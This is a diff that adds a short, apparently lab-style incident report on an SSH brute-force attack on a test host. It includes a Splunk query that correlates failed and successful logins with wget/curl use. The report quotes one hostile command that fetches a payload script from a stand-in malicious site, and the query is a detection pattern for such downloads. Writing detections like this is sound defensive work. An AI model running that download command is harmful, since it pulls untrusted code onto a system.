@@ -1,0 +1,43 @@
+==============================
+🛡️ INCIDENT REPORT – SSH Brute Force + Suspicious Command
+==============================
+
+📅 Date: June 4, 2025  
+📍 Host: siem-server  
+👤 User: testuser  
+
+---
+
+🧪 Summary of Events:
+
+1. Multiple failed SSH login attempts (brute force)
+2. One successful SSH login
+3. Suspicious command executed: `wget http://malicious-site.com/payload.sh`
+
+---
+
+📄 Log Sources Involved:
+
+- /var/log/auth.log (SSH login activity)
+- /home/testuser/.bash_history (user command execution)
+
+---
+
+🔍 Detection Approach:
+
+- Combined logs using Splunk
+- Normalized `user` and `host` fields
+- Correlated failed logins, success, and `wget` via SPL
+
+# spl
+
+index=* (sourcetype=linux_secure OR sourcetype=bash_history)
+("Failed password" OR "Accepted password" OR "wget" OR "curl")
+| eval user=coalesce(user, "testuser")
+| eval event_type=case(
+    sourcetype=="linux_secure" AND searchmatch("Failed password"), "SSH Failed Login",
+    sourcetype=="linux_secure" AND searchmatch("Accepted password"), "SSH Success",
+    sourcetype=="bash_history" AND (searchmatch("wget") OR searchmatch("curl")), "Suspicious Command"
+)
+| stats count by _time user host event_type sourcetype
+| sort _time
